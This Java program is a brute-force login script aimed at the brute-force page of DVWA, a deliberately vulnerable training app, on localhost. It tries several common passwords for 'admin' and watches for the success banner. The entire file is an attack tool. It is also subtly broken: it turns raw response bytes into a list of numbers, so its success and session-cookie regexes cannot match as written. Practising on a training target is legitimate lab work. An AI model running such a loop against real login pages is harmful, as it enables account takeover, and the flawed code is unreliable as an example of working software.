import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {

    private static final String SERVER_URL = "http://localhost/DVWA/vulnerabilities/brute/";
    private static final String USERNAME = "admin";

    public static void main(String[] args) throws IOException {
        List<String> passwords = Arrays.asList("password", "123456", "qwerty", "12345678");

        for (String password : passwords) {
            HttpURLConnection connection = (HttpURLConnection) new URL(SERVER_URL +
                    "?username=" + USERNAME +
                    "&password=" + password +
                    "&Login=Login#").openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("Cookie", "PHPSESSID=" + getSessionId());

            String response = Arrays.toString(connection.getInputStream().readAllBytes());

            Matcher matcher = Pattern.compile("Welcome to the password protected area (.*)").matcher(response);
            if (matcher.find()) {
                System.out.println("Password is '" + password + "'");
                return;
            }
        }

        System.out.println("Password not found");
    }

    private static String getSessionId() throws IOException {
        HttpURLConnection connection = (HttpURLConnection) new URL(SERVER_URL).openConnection();
        connection.setRequestMethod("GET");

        String response = Arrays.toString(connection.getInputStream().readAllBytes());

        Matcher matcher = Pattern.compile("PHPSESSID=(.*)").matcher(response);
        if (matcher.find()) {
            return matcher.group(1);
        }

        return null;
    }
}
